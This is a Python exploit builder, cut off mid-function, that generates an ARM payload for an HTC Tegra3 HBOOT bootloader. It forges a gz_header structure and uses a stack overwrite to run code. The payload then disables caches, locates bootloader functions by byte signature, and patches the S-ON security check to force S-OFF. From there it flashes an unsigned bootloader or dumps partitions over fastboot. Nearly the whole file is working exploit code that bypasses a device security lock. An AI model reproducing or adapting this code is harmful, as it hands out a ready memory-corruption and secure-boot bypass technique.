import binascii
import struct
import asm
import utils
import consts
import patcher

class PayloadBuffer:
    _buf = None
    _max_len = None
    _start_addr = 0

    def __init__(self, start_addr, max_len = None):
        self._start_addr = start_addr
        self._max_len = max_len
        self._buf = bytearray()

    def start_addr(self):
        return self._start_addr

    def len(self):
        return len(self._buf)

    def finish(self) -> bytearray:
        buf = self._buf
        self._buf = None
        if self._max_len:
            if len(buf) < self._max_len:
                buf += bytes(self._max_len - len(buf))
            if len(buf) > self._max_len:
                raise ValueError(f"buffer {len(buf)} exceeds max length {self._max_len}")
        return buf

    def append(self, data: bytes):
        if self._max_len and self.len() + len(data) > self._max_len:
            raise ValueError(f"buffer {self.len()} + data {len(data)} exceeds max length {self._max_len}")
        self._buf += data

    def store(self, data: bytes, alignment = 4) -> dict:
        addr = self.len()
        padding = utils.align_padding(self._start_addr + addr, alignment)
        if 0 < padding:
            addr += padding
            self.append(bytes(padding))
        self.append(data)
        return {
            "addr": self._start_addr + addr,
            "offset": addr,
            "len": len(data),
        }

    def set_data(self, offset: int, data: bytes):
        for i, b in enumerate(data):
            self._buf[offset + i] = b

def generate_exploit_gz_header(length: int, addr: int):
    # Create fake gz_headerp
    gz_headerp_struct_fmt = "<iLiiLIILILIii"
    gz_headerp_struct = struct.pack(
        gz_headerp_struct_fmt,
            0, #int text
            0, #uLong time
            0, #int xflags
            0, #int os
            0, #[0x10] Bytef* extra
            0, #uInt extra_len
            0, #uInt extra_max
            addr, #Bytef* name
            length, #[0x20] uInt name_max
            0, #Bytef* comment
            0, #uInt comm_max
            0, #int hcrc
            0, #[0x30] int done
    )
    if len(gz_headerp_struct) != struct.calcsize(gz_headerp_struct_fmt):
        raise RuntimeError(
            "gz_headerp_struct size mismatch!",
            len(gz_headerp_struct),
            struct.calcsize(gz_headerp_struct_fmt)
        )

    #Some extra padding just in case
    gz_headerp_struct += bytes(0x1000)

    return gz_headerp_struct

class PayloadContext:
    def __init__(self, args, bl_data, vars_size):
      self.args = args
      vars_size += consts.PAYLOAD_EXTRA_PADDING
      #Used for pre relocation data
      self.payload_exploit = PayloadBuffer(
          start_addr=args.fastboot_start + consts.PAYLOAD_ZIP_RESERVED,
          max_len=None
      )
      #Used for post relocation variables that are outside checksums
      self.payload_vars = PayloadBuffer(
          start_addr=consts.PAYLOAD_RELOCATED_ADDR,
          max_len=vars_size
      )
      #Used for post relocation data
      self.payload_data = PayloadBuffer(
          start_addr=consts.PAYLOAD_RELOCATED_ADDR + vars_size,
          max_len=None
      )
      self.bl_data = bl_data
      self.hboot_functions = {}
      self.functions = {}
      self.strings = {}

    def store_vars(self, data: bytes, alignment = 4) -> dict:
        return self.payload_vars.store(data=data, alignment=alignment)

    def store_data(self, data: bytes, alignment = 4) -> dict:
        return self.payload_data.store(data=data, alignment=alignment)

    def store_str(self, text: str) -> dict:
        if text in self.strings:
            raise ValueError(f"Duplicate text for '{text}'")
        data = self.payload_data.store(data=bytes(text, "ascii"), alignment=4)
        self.strings[text] = data
        return data

    def store_code(self, thumb, code) -> dict:
        code_compiled = asm.compile_arm(code, thumb=thumb)
        return self.store_data(data = code_compiled, alignment = 4)

    def store_patch(self, patch: patcher.PatchData, original: bytes|list|None) -> dict:
        code_compiled = asm.compile_arm(patch.code, thumb=(patch.arch == "thumb"))
        if patch.size is not None and patch.size != len(code_compiled):
            #Check size matches expected amount to write
            raise ValueError(f"Expected {patch.size} bytes patch to apply, but compiled patch uses {len(code_compiled)}")
        if original is not None and len(code_compiled) != len(original):
            #Check size matches expected amount to read
            raise ValueError(f"Patch is {len(code_compiled)} bytes, but original data is {len(original)}")

        data = self.store_data(data = code_compiled, alignment = 4)
        data["patch_offset"] = patch.offset
        if original is None:
            data["original"] = None
        else:
            data["original"] = self.store_data(data = bytes(original), alignment = 4)
        return data

    def call_hboot_function(self, func, extra_code=None, *args, **kwargs):
        func_data = self.hboot_functions[func]
        if (func_data["ptr"] % 4) != 0:
            raise ValueError(f"Address {func_data["ptr"]} is not aligned!")
        code=f"""
            ldr r11, [r11];
        """
        if func_data["arch"] == "thumb":
            code += f"""
                add  r11, #1;
            """
        if extra_code is not None:
            code += extra_code
        return asm.call(addr=func_data["ptr"], extra_code=code, *args, **kwargs)

def generate_patching_call(context, destination_ptr, patch):
    offset_op = "sub" if patch["patch_offset"] < 0 else "add"
    code = f"""
        {asm.mov32("r0", destination_ptr)};
        ldr r0, [r0];
        {asm.mov32("r1", abs(patch["patch_offset"]))};
        {offset_op} r0, r1;
    """
    if patch["original"] is not None:
        tmp_var = context.store_vars(bytes(4))["addr"]
        str_fail_error = context.strings["FAIL# ERROR! Code 0x%x\0"]["addr"]
        code += f"""
            push {{r0}};
            mov  r3, r0;
            {asm.mov32("r0", tmp_var)};
            {asm.mov32("r1", patch["original"]["addr"])};
            {asm.mov32("r2", patch["original"]["len"])};
            add  r4, r3, r2;
            {asm.call(context.functions["data_search"])};
            ldr  r1, [r0];
            cmp  r1, #0;
            bne  Found;
            mov  r1, r0;
            {asm.mov32("r0", str_fail_error)};
            {asm.call(context.functions["print"])};
            {asm.call(context.functions["reboot_ruu"])};
            
        Found:
            pop  {{r0}};
        """

    code += f"""
        {asm.mov32("r1", patch["addr"])};
        {asm.mov32("r2", patch["len"])};
        {context.call_hboot_function("memcpy")};
    """
    return code

def prepare_dumper_payload(context: PayloadContext):
    context.hboot_functions["fastboot_send_info"] = {
        "ptr": context.store_vars(bytes(4))["addr"],
        "offset": -16,
        "arch": "thumb",
        "code": [
            0x00, 0xaf, 0x07, 0xf5, 0x87, 0x65, 0x7c, 0x44,
            0x24, 0x68, 0x4f, 0xf4, 0x80, 0x62, 0x07, 0xf1,
            0x0c, 0x00, 0x55, 0xf8, 0x04, 0x6b, 0x4f, 0xf0,
            0x00, 0x09, 0x23, 0x68
        ]
    }
    #This patch stops fastboot send func from breaking lines when encountering \r or \n
    fastboot_send_breakline_func_patch = context.store_patch(patch = patcher.PatchData(
        offset = 0x60,
        size = 2,
        arch = "thumb",
        code = "b #0x22;",
    ), original = [0x2a, 0x5d])
    context.hboot_functions["read_partition"] = {
        "ptr": context.store_vars(bytes(4))["addr"],
        "arch": "thumb",
        "code": [
            0x2d, 0xe9, 0xf0, 0x43, 0x95, 0xb0, 0x90, 0x46,
            0x1c, 0x46, 0x6f, 0xf0, 0x62, 0x02, 0x00, 0x23,
            0x07, 0x46, 0x04, 0x93, 0x0d, 0x46, 0x4f, 0xf0,
            0xff, 0x33, 0xcd, 0xe9, 0x06, 0x23
        ],
    }
    tmp_addr = 0x85000000
    dump_marker = consts.DUMP_START_MARKER
    dump_string_len = 1024 - len(dump_marker)
    str_info_dump_start = context.store_str(f'INFO# DUMP {{"state":"start","partition":"%s","length":"0x%08x"}}\0')["addr"]
    str_info_dump_done = context.store_str('INFO# DUMP {"state":"done","partition":"%s","crc":"0x%x"}\0')["addr"]
    str_fail_error = context.strings["FAIL# ERROR! Code 0x%x\0"]["addr"]
    dump_string_buffer = context.store_vars(dump_marker + bytes(dump_string_len + 0x20))

    context.functions["fastboot_dump_memory"] = context.store_code(thumb=True, code=f"""
            # Args r0 = Address r1 = Length
            # State
            # r0 = Current char ptr, r1 = Max char addr excl zero terminator
            # r2 = Current memory offset, r3 = Memory length
            # r4 = Start of string addr, r5 = Start memory addr
            # r6 = Temporary register, r7 = Mask used for encoding
            push {{r4, r5, r6, r7, lr}};
            mov  r5, r0; //Start memory address
            mov  r3, r1; //Memory length
            {asm.mov32("r4", dump_string_buffer["addr"])};
            mov  r2, #0; //Memory offset
            {asm.mov32("r1", dump_string_len)};
            add  r1, r4; //Max string address
            mov  r6, #0; //Temporary

        DumpNextLine:
            # Check if we read all
            cmp  r2, r3;
            bhs  Return;
            
            #Reset ptr to start of writable buffer (we skip the text marker)
            add  r0, r4, #{len(dump_marker)};
            
            # Write address
            bl   WriteWord;
            
        DumpNextWord:
            # We read all memory?
            cmp  r2, r3;
            bhs  DumpPrintLine;
            
            # Check if there is space for another word that might take 8 bytes in the str line
            sub  r6, r1, r0;
            cmp  r6, #8;
            blt  DumpPrintLine;
            
            # Get the next 4 bytes
            mov  r6, r2;
            ldr  r2, [r5, r6];
            
            # Write data
            bl   WriteWord;
            
            # Restore and increment r2
            add  r2, r6, #4;
            
            b    DumpNextWord;

        DumpPrintLine:
            # Set null terminator
            mov  r6, #0;
            strb r6, [r0];
            
            # Print the string buffer
            mov  r0, r4;
            push {{r0, r1, r2, r3, r4, r5, r6, r7}};
            {context.call_hboot_function("fastboot_send_info")};
            pop  {{r0, r1, r2, r3, r4, r5, r6, r7}};
            b    DumpNextLine;
            
        Return:
            pop {{r4, r5, r6, r7, pc}};
        
        WriteWord:
            #Args r0 = String to write, r1 = Max string address, r2 = Value to write, r7 = Mask
            push {{r2, r3, r4, r5, lr}};
            
            mov r3, #0;
            
        WriteWordNextByte:
            # Get next byte
            and  r4, r2, #0xFF

            # If 0x25 (%) map to 2
            cmp  r4, #0x25;
            bne  WriteWordNotFormat;
            mov  r4, #2;
            b    WriteWordStoreByte;
        
        WriteWordNotFormat:
            # If 0, map to 1
            cmp  r4, #0;
            bne  WriteWordNotZero;
            mov  r4, #1;
            b    WriteWordStoreByte;
        
        WriteWordNotZero:
            # Escape 1, 2 and 3 with 3 prefix
            cmp  r4, #3;
            bls  WriteWordStoreEscapedByte;
            
        WriteWordStoreByte:
            strb r4, [r0];
            add  r0, #1;
            
            # Check if we wrote all 4 bytes
            add  r3, #1;
            cmp  r3, #4;
            bhs  WriteWordReturn;
            
            # Go to next byte
            lsr  r2, #8
            b    WriteWordNextByte;
        
        WriteWordStoreEscapedByte:
            mov  r5, #3;
            strb r5, [r0];
            add  r0, #1;
            b    WriteWordStoreByte;
        
        WriteWordReturn:
            pop {{r2, r3, r4, r5, pc}};
    """)["addr"] + 1

    context.functions["dump_partition"] = context.store_code(thumb=True, code=f"""
            #Args r0 = Partition name ptr r1 = Partition length
    
            {asm.mov32("r2", tmp_addr)};
            push {{r0, r1, r2, lr}};
            ldr  r1, [sp]; //Part name
            ldr  r2, [sp, #4]; //Len
            {asm.mov32("r0", str_info_dump_start)};
            {asm.call(context.functions["print"])};
            
            ldr  r0, [sp]; //Part name
            mov  r1, #0; //Part offset
            ldr  r2, [sp, #8]; //Ptr
            ldr  r3, [sp, #4]; //Len
            {context.call_hboot_function("read_partition")};
            cmp  r0, #0;
            beq  { "GetPartitionCRC" if context.args.mode == "partitions_crc" else "PartitionDump" };
            # Failed read
            push {{r0}};
            mov  r1, r0;
            {asm.mov32("r0", str_fail_error)};
            {asm.call(context.functions["print"])};
            pop {{r0}};
            b Return;

        PartitionDump:
            ldr  r0, [sp, #8]; //Ptr
            ldr  r1, [sp, #4]; //Len
            {asm.call(context.functions["fastboot_dump_memory"])};
        
        GetPartitionCRC:
            # Get the CRC32
            mov  r0, #0;
            ldr  r1, [sp, #8];
            ldr  r2, [sp, #4];
            {context.call_hboot_function("crc32")}
            
            # Send the CRC32 and signal we finished the dump
            ldr  r1, [sp]; //Part name
            mov  r2, r0;
            {asm.mov32("r0", str_info_dump_done)};
            {asm.call(context.functions["print"])};

        Return:
            add sp, #12;
            pop {{pc}};
    """)["addr"] + 1

    dump_partitions_code = ""
    for part in consts.DUMP_PARTITIONS:
        if not part["hidden"] and not context.args.backup_all:
            continue
        str_ptr = context.store_str(part["name"] + '\0')["addr"]
        dump_partitions_code += f"""
            {asm.mov32("r0", str_ptr)};
            {asm.mov32("r1", part["length"])};
            {asm.call(context.functions["dump_partition"])};
            cmp  r0, #0;
            bne  RebootRUU;
        """

    context.functions["payload_mode"] = context.store_code(thumb=True, code = f"""
            #Copy original fastboot code so we can disable strlen and pass our length manually
            {generate_patching_call(context, context.hboot_functions["fastboot_send_info"]["ptr"], fastboot_send_breakline_func_patch)};
            
            # Wait for barrier so we don't run unpatched code
            dsb SY;
            isb SY;

            #Run partition dumping code
            {dump_partitions_code}

        RebootRUU:
            {asm.call(context.functions["reboot_ruu"])};
            b   RebootRUU
    """)["addr"] + 1


def prepare_flasher_payload(context: PayloadContext):
    ebt_data_crc = binascii.crc32(context.bl_data)
    str_BCT = context.store_str("BCT\0")["addr"]
    str_EBT = context.store_str("EBT\0")["addr"]
    ebt_data = context.store_data(context.bl_data)
    str_info_validating_crc_bootloader = context.store_str("INFO# Validating CRC32 of bootloader to flash.\0")["addr"]
    str_info_validating_new_hboot = context.store_str("INFO# Validating strings and symbols of HBOOT to flash.\0")["addr"]
    str_info_flashing = context.store_str("INFO# Flashing, please wait at least 1 minute before restarting if doesn't respond!\0")["addr"]
    str_info_s_on_value = context.store_str("INFO# Current S-ON value: %d\0")["addr"]
    str_fail_invalid_hboot = context.store_str("FAIL# The bootloader to flash is not valid HBOOT or for this platform! code 0x%x\0")["addr"]
    str_fail_crc_mismatch = context.strings["FAIL# Detected CRC mismatch! (expected 0x%x got '0x%x'). Try sending it again.\0"]["addr"]
    str_fail_error = context.strings["FAIL# ERROR! Code 0x%x\0"]["addr"]
    str_fail_already_soff = context.store_str("FAIL# This device is already S-OFF! flashing may result in brick and needing to restore using APX/RCM\0")["addr"]
    context.hboot_functions["write_bootloader"] = {
        "ptr": context.store_vars(bytes(4))["addr"],
        "arch": "thumb",
        "code": [
            0x2d, 0xe9, 0xf0, 0x4f, 0xa7, 0xb0, 0x66, 0x4e,
            0x1c, 0x46, 0x06, 0x90, 0x0d, 0x46, 0x7e, 0x44,
            0x36, 0x68, 0x21, 0x46, 0x00, 0x23, 0x91, 0x46,
            0x30, 0x68, 0x11, 0x93, 0x25, 0x90, 0x10, 0x46
        ],
    }
    patch_s_off = patcher.find_patch("Force S-OFF")
    context.hboot_functions["is_s_on"] = {
        "ptr": context.store_vars(bytes(4))["addr"],
        "offset": -6,
        "arch": "thumb",
        "code": patch_s_off.search.code,
    }
    is_s_on_func_patch = context.store_patch(patcher.PatchData(
        offset = 2,
        size = 4,
        arch = "thumb",
        code = f"""
            movs r0, #0;
            pop {{r3, pc}}
        """,
    ), original = None)
    context.functions["payload_mode"] = context.store_code(thumb=True, code =f"""
        #Fix is_S-ON function pointer and keep the original patch search location
        {asm.mov32("r0", context.hboot_functions["is_s_on"]["ptr"])};

        # Send print
        {asm.mov32("r0", str_info_validating_crc_bootloader)};
        {asm.call(context.functions["print"])};
        
        # Do bootloader checksum
        mov  r0, #0;
        {asm.mov32("r1", ebt_data["addr"])};
        {asm.mov32("r2", ebt_data["len"])};
        {context.call_hboot_function("crc32")}
        
        # Check bootloader checksum against expected value
        {asm.mov32("r1", ebt_data_crc)};
        cmp  r0, r1;
        beq  PayloadHBOOTCRCIsOK;
        mov  r2, r0;
        {asm.mov32("r0", str_fail_crc_mismatch)};
        {asm.call(context.functions["print"])};
        b RebootRUU;

    PayloadHBOOTCRCIsOK:
        # Send print
        {asm.mov32("r0", str_info_validating_new_hboot)};
        {asm.call(context.functions["print"])};

        # Validate new bootloader strings
        {asm.mov32("r0", ebt_data["addr"])};
        {asm.call(context.functions["validate_hboot_strings"])};
        cmp  r0, #1;
        beq  PayloadHBOOTStringsOK;
        mov  r1, r0;
        {asm.mov32("r0", str_fail_invalid_hboot)};
        {asm.call(context.functions["print"])};
        b Reboot;

    PayloadHBOOTStringsOK:
        # Validate new bootloader symbols
        {asm.mov32("r0", ebt_data["addr"])};
        {asm.mov32("r1", ebt_data["len"])};
        add r1, r0;
        {asm.call(context.functions["validate_hboot_symbols"])};
    
    PayloadHBOOTSymbolsOK:
        # Get and print current value of S-ON
        {context.call_hboot_function("is_s_on")};
        mov  r1, r0;
        push {{r1}};
        {asm.mov32("r0", str_info_s_on_value)};
        {asm.call(context.functions["print"])};
        pop  {{r1}};
        cmp  r1, #0;
        beq  IsAlreadySOFF;

        # Patch S-ON function to return like S-OFF if returned value is S-ON
        {generate_patching_call(context, context.hboot_functions["is_s_on"]["ptr"], is_s_on_func_patch)};
        
        # Wait for barrier so we don't run unpatched code
        dsb SY;
        isb SY;

        # Print current value of S-ON
        {context.call_hboot_function("is_s_on")};
        mov  r1, r0;
        push {{r1}};
        {asm.mov32("r0", str_info_s_on_value)};
        {asm.call(context.functions["print"])};
        pop  {{r1}};
        cmp  r1, #0;
        beq  IsSOFF;
        {asm.mov32("r0", str_fail_error)};
        {asm.call(context.functions["print"])};
        b    RebootRUU;
    
    IsSOFF:
        # Print we are gonna flash
        {asm.mov32("r0", str_info_flashing)};
        {asm.call(context.functions["print"])};
        
        # Do the actual flashing
        {asm.mov32("r0", str_BCT)};
        {asm.mov32("r1", str_EBT)};
        {asm.mov32("r2", ebt_data["addr"])};
        {asm.mov32("r3", ebt_data["len"])};
        {context.call_hboot_function("write_bootloader")};
        
        # Check result
        cmp  r0, #0;
        bne  RebootRUU;

        # Go to hboot
        {asm.mov32("r0", consts.HBOOT_REASON_ADDR)};
        {asm.mov32("r1", consts.HBOOT_REASON_FASTBOOT)};
        str  r1, [r0];
        b    Reboot;
        
    IsAlreadySOFF:
        {asm.mov32("r0", str_fail_already_soff)};
        {asm.call(context.functions["print"])};
        b    Reboot;
        
    RebootRUU:
        {asm.call(context.functions["reboot_ruu"])};
    Reboot:
        {asm.call(context.functions["reboot"])};
        b    Reboot;
    """)["addr"] + 1

def prepare_payload(context: PayloadContext, symbols: [str], stack_smash_count: int, stack_base: int):
    stack_target = stack_base - (stack_smash_count * 4)
    print(f"-> Stack target 0x{stack_target:x} base 0x{stack_base:x}")

    tmp_var = context.store_vars(bytes(4))["addr"]
    #Contains both CRC32 of payload and length of payload, 32bits each
    payload_checksum = context.store_vars(bytes(8))
    payload_checksum_length = payload_checksum["addr"] + 4

    #Everything in context.payload at this point will be checksum'd
    str_T30S = context.store_str("T30S\0\0")
    str_SHIP = context.store_str("SHIP\0\0")
    str_HBOOT_T30S = context.store_str("HBOOT-T30S\0\0")
    str_info_validating_crc_payload = context.store_str("INFO# Validating CRC32 of payload.\0")["addr"]
    str_info_startup = context.store_str("INFO# Fastboot Online. Exploit Online. Code Online. All Systems Nominal.\0")["addr"]
    str_info_validating_current_hboot = context.store_str("INFO# Validating symbols of HBOOT in device.\0")["addr"]
    str_fail_hboot_symbol_not_found = context.store_str("FAIL# Bootloader symbol not found: index 0x%x\0")["addr"]
    str_fail_crc_mismatch = context.store_str("FAIL# Detected CRC mismatch! (expected 0x%x got '0x%x'). Try sending it again.\0")["addr"]
    context.store_str("FAIL# ERROR! Code 0x%x\0")
    context.hboot_functions["print"] = {
        "ptr": context.store_vars(bytes(4))["addr"],
        "arch": "thumb",
        "code": [
        0x0f, 0xb4, 0x00, 0x21, 0x70, 0xb5, 0xc2, 0xb0,
        0x12, 0x4c, 0x46, 0xad, 0x4f, 0xf4, 0x80, 0x72,
        0x7c, 0x44, 0x24, 0x68, 0x55, 0xf8, 0x04, 0x6b,
        0x20, 0x68, 0x41, 0x90, 0x01, 0xa8
    ]}
    context.hboot_functions["memcpy"] = {
        "ptr": context.store_vars(bytes(4))["addr"],
        "arch": "arm",
        "code": [
        0x04, 0xb0, 0x2d, 0xe5, 0x00, 0xb0, 0x8d, 0xe2,
        0x24, 0xd0, 0x4d, 0xe2, 0x18, 0x00, 0x0b, 0xe5,
        0x1c, 0x10, 0x0b, 0xe5, 0x20, 0x20, 0x0b, 0xe5,
        0x18, 0x30, 0x1b, 0xe5, 0x0c, 0x30, 0x0b, 0xe5,
        0x1c, 0x30, 0x1b, 0xe5, 0x08, 0x30, 0x0b, 0xe5,
        0x1c, 0x30, 0x1b, 0xe5, 0x03, 0x30, 0x03, 0xe2,
        0x00, 0x00, 0x53, 0xe3
    ]}
    context.hboot_functions["crc32"] = {
        "ptr": context.store_vars(bytes(4))["addr"],
        "arch": "thumb",
        "code": [
            0xf7, 0xb5, 0x00, 0x29, 0x00, 0xf0, 0xb8, 0x82,
            0x01, 0x23, 0x01, 0x93, 0x00, 0x2b, 0x00, 0xf0,
            0x44, 0x81, 0xdf, 0xf8, 0x68, 0x35, 0xc0, 0x43,
            0x7b, 0x44, 0x09, 0xe0, 0x11, 0xf8, 0x01, 0x6b,
            0x01, 0x3a, 0x86, 0xea, 0x00, 0x05, 0xec, 0xb2,
            0x53, 0xf8, 0x24, 0x40, 0x84, 0xea, 0x10, 0x20
        ]
    }
    context.hboot_functions["sleep"] = {
        "ptr": context.store_vars(bytes(4))["addr"],
        "arch": "arm",
        "code": [
            0x30, 0x48, 0x2d, 0xe9, 0x0c, 0xb0, 0x8d, 0xe2,
            0x08, 0xd0, 0x4d, 0xe2, 0x10, 0x00, 0x0b, 0xe5,
            0x9c, 0x40, 0x9f, 0xe5, 0x04, 0x40, 0x8f, 0xe0
        ]
    }

    reboot_code = f"""
    Reboot:
        # Barrier in case there is pending data
        dsb  SY;
        # Write PMC to reboot
        {asm.mov32("r0", consts.PMC_ADDR)};
        mov  r1, {hex(consts.PMC_REBOOT)};
        str  r1, [r0];
        # Shouldn't reach here
        b    Reboot;
    """
    context.functions["reboot"] = context.store_code(thumb=True, code = reboot_code)["addr"] + 1

    context.functions["reboot_ruu"] = context.store_code(thumb=True, code = f"""
        # Write magic
        {asm.mov32("r0", consts.HBOOT_REASON_ADDR)};
        {asm.mov32("r1", consts.HBOOT_REASON_RUU)};
        str  r1, [r0];
        {asm.call(context.functions["reboot"])};
    """)["addr"] + 1

    context.functions["memset"] = context.store_code(thumb=True, code = f"""
        # Args r0 = Start r1 = Value r2 = Length
        add  r2, r0, r2;
    Loop:
        str  r1, [r0];
        add  r0, #4;
        cmp  r0, r2;
        bls  Loop;

        bx  lr;
    """)["addr"] + 1

    #Implement sleep that doesn't use interrupts/thread switching
    sleep_patch = context.store_patch(patch = patcher.PatchData(
        offset = 0,
        size = 44,
        arch = "arm",
        code = f"""
            push {{r1, lr}};
        Loop:
            cmp  r0, #1;
            blo  Exit;
            sub  r0, #1;
            mov  r1, #0x80000;
        SubLoop:
            cmp  r1, #1;
            blo  Loop;
            sub  r1, #1;
            b  SubLoop;
        Exit:
            movs r0, #0;
            pop {{r1, pc}};
        """,
    ), original = None)

    context.functions["print"] = context.store_code(thumb=True, code = f"""
        push {{r11, lr}};
        # Get print func ptr, if is null then reboot
        {asm.mov32("r11", context.hboot_functions["print"]["ptr"])};
        ldr r11, [r11];
        cmp r11, #0;
        beq Reboot;
        add r11, #1;
        blx r11;
        pop {{r11, pc}};
    Reboot:
        {asm.call(context.functions["reboot"])};
        b Reboot;
    """)["addr"] + 1

    context.functions["data_search"] = context.store_code(thumb=True, code = f"""
        #Args:
        #r0 = Address to store the found data address or null 
        #r1 = Address of data to search
        #r2 = Amount of data to match
        #r3 = Start address to search
        #r4 = End address to search
        
        #Internal:
        #r5 = Value to match
        #r6 = Value from memory
        #r7 = Matching offset
        
        push {{r3,r4,r5,r6,r7,lr}}
        
        #Set value pointed by r0 as null in case is not found
        mov r7, #0;
        str r7, [r0];

    ResetSearch:
        #Check if we reached end
        cmp r3, r4;
        bhs Return;
        #Reset search offset to start
        mov r7, #0;
        
    Compare:
        # Check if we compared all
        cmp r7, r2;
        bhs Found;

        # Load current values to compare
        ldrh r5, [r1, r7];
        ldrh r6, [r3, r7];
        # Go to next offset
        add r7, #2;
        
        # If this part matches keep comparing
        cmp r5, r6;
        beq Compare;
        
        # Not a match, increment search addr and reset
        add r3, #2;
        b ResetSearch;
        
    Found:
        #Store the current searched address into what r0 points
        str r3, [r0];
        
    Return:
        pop {{r3,r4,r5,r6,r7,pc}}
    """)["addr"] + 1

    context.functions["code_search"] = context.store_code(thumb=True, code = f"""
        push {{lr}};
        #Set loaded hboot memory region addresses
        {asm.mov32("r3", consts.BL_LOAD_ADDRESS)};
        {asm.mov32("r4", consts.BL_LOAD_ADDRESS + consts.HBOOT_LENGTH)};
        {asm.call(context.functions["data_search"])};
    Return:
        pop {{pc}}; 
    """)["addr"] + 1

    context.functions["validate_hboot_strings"] = context.store_code(thumb=True, code = f"""
        push {{r0, lr}};

        #Check T30S platform string
        {asm.mov32("r0", tmp_var)};
        {asm.mov32("r1", str_T30S["addr"])};
        {asm.mov32("r2", str_T30S["len"])};
        ldr  r3, [sp];
        add  r3, #0x10;
        add  r4, r3, #0x6;
        {asm.call(context.functions["data_search"])};
            
        #Return if was not found
        ldr  r1, [r0];
        cmp  r1, #0;
        beq  NotFound;
    
        #Check HBOOT-T30S platform string
        {asm.mov32("r0", tmp_var)};
        {asm.mov32("r1", str_SHIP["addr"])};
        {asm.mov32("r2", str_SHIP["len"])};
        ldr  r3, [sp];
        add  r3, #0x20;
        add  r4, r3, #0x6;
        {asm.call(context.functions["data_search"])};
                    
        #Return if was not found
        ldr  r1, [r0];
        cmp  r1, #0;
        beq  NotFound;
    
        #Check HBOOT-T30S platform string
        {asm.mov32("r0", tmp_var)};
        {asm.mov32("r1", str_HBOOT_T30S["addr"])};
        {asm.mov32("r2", str_HBOOT_T30S["len"])};
        ldr  r3, [sp];
        add  r3, #0x30;
        add  r4, r3, #0xc;
        {asm.call(context.functions["data_search"])};
            
        #Return if was not found
        ldr  r1, [r0];
        cmp  r1, #0;
        beq  NotFound;
        
        mov  r0, #1;
        b  Return;
    
    NotFound:
        mov r0, #0;
    Return:
        add sp, #4;
        pop {{pc}};
    """)["addr"] + 1

    hboot_symbols_search_code = ""
    for i, symbol in enumerate(symbols):
        str_symbol = context.store_data(bytes(symbol, encoding="ascii"))
        hboot_symbols_search_code += f"""
            #Check symbol string
            {asm.mov32("r0", tmp_var)};
            {asm.mov32("r1", str_symbol["addr"])};
            {asm.mov32("r2", str_symbol["len"])};
            ldr  r3, [sp];
            ldr  r4, [sp, #4];
            {asm.call(context.functions["data_search"])};
                
            #Return if was not found
            ldr  r3, [r0];
            mov  r0, #{hex(i + 1)};
            cmp  r3, #0;
            beq  NotFound;
        """

    context.functions["validate_hboot_symbols"] = context.store_code(thumb=True, code = f"""
        push {{r0, r1, lr}};

        # Here we put generated code to match each expected symbol
        {hboot_symbols_search_code}

        # Check if last index matches the count of symbols, means all were found
        cmp  r0, #{hex(len(symbols))};
        beq  Return;

    NotFound:
        mov  r1, r0;
        {asm.mov32("r0", str_fail_hboot_symbol_not_found)};
        {asm.call(context.functions["print"])};
        {asm.call(context.functions["reboot"])};
    Return:
        add sp, #8;
        pop {{pc}};
    """)["addr"] + 1

    if context.args.mode == "flash":
        prepare_flasher_payload(context)
    elif context.args.mode in ["backup", "partitions_crc"]:
        prepare_dumper_payload(context)
    else:
        raise ValueError(f"Unknown mode {context.args.mode}")

    #This code has to be generated after calling payload type prepare
    hboot_func_search_code = ""
    for func in context.hboot_functions.values():
        func_search = context.store_data(bytes(func["code"]))
        hboot_func_search_code += f"""
            {asm.mov32("r0", func["ptr"])};
            {asm.mov32("r1", func_search["addr"])};
            {asm.mov32("r2", func_search["len"])};
            {asm.call(context.functions["code_search"])};
            ldr  r1, [r0];
            cmp  r1, #0;
            beq  RebootRUU;
        """
        if "offset" in func and func["offset"] != 0:
            offset_op = "sub" if func["offset"] < 0 else "add"
            hboot_func_search_code += f"""
                {asm.mov32("r2", abs(func["offset"]))};
                {offset_op} r1, r2;
                str r1, [r0];
            """

    common_setup_code = f"""
        #Disable interrupts
        mrs  r0, cpsr;
        orr  r0, #0x80;
        msr  cpsr_cxsf, r0;

        # Barriers
        dsb SY;
        isb SY;
        
        # Read SCTLR
        mrc  p15, 0, r4, c1, c0, 0
        # Disable I-Cache
        bic  r4, #{(1<<12)}
        # Disable D-Cache
        bic  r4, #{(1<<2)}
        # Write SCTLR
        mcr  p15, 0, r4, c1, c0, 0

        # Invalidate I-Cache
        mov r0, #0;
        mcr  p15, 0, r0, c7, c5, 0;
    
        # Invalidate the TLBs
        mcr  p15, 0, r0, c8, c5, 0;
        mcr  p15, 0, r0, c8, c6, 0;
        
        # Barriers
        dsb SY;
        isb SY;
    """

    context.store_data(struct.pack("<I", consts.PAYLOAD_MAGIC))
    payload_addr = context.store_code(thumb=True, code = f"""        
        {common_setup_code};

        # Validate current hboot in RAM before continuing
        {asm.mov32("r0", consts.BL_LOAD_ADDRESS)};
        {asm.call(context.functions["validate_hboot_strings"])};
        cmp  r0, #1;
        bne  RebootRUU;

        # Search functions in the RAM
        {hboot_func_search_code};
        
        # At this point we can use code in hboot as is validated and all functions found

        # Patch sleep function so it doesn't hang the system with interrupts off
        {generate_patching_call(context, context.hboot_functions["sleep"]["ptr"], sleep_patch)};

        # Wait for barrier so we don't run unpatched code
        dsb SY;
        isb SY;

        # Send first print
        {asm.mov32("r0", str_info_startup)};
        {asm.call(context.functions["print"])};
        
        # Clear stack just in case
        {asm.mov32("r0", stack_target)};
        mov  r1, #0x58585858;
        {asm.mov32("r2", stack_base - stack_target)};
        {asm.call(context.functions["memset"])};

        # Clear fastboot buffer just in case
        {asm.mov32("r0", context.args.fastboot_start)};
        bic  r0, #3;
        {asm.mov32("r2", payload_checksum_length)};
        ldr  r2, [r2];
        {asm.mov32("r1", consts.PAYLOAD_ZIP_RESERVED + consts.PAYLOAD_LOADER_RESERVED)};
        add  r2, r1;
        mov  r1, #0x58585858;
        {asm.call(context.functions["memset"])};
        
        # Send print
        {asm.mov32("r0", str_info_validating_crc_payload)};
        {asm.call(context.functions["print"])};
        
        # Do payload checksum
        mov  r0, #0;
        #We load payload to checksum addr
        {asm.mov32("r1", context.payload_data.start_addr())};
        #We load payload length
        {asm.mov32("r2", payload_checksum_length)};
        ldr  r2, [r2];
        {context.call_hboot_function("crc32")};
        
        # Check payload checksum against expected value
        {asm.mov32("r1", payload_checksum["addr"])};
        ldr  r1, [r1];
        cmp  r0, r1;
        beq  PayloadCRCIsOK;
        mov  r2, r0;
        {asm.mov32("r0", str_fail_crc_mismatch)};
        {asm.call(context.functions["print"])};
        b RebootRUU;

    PayloadCRCIsOK:
        # Send print
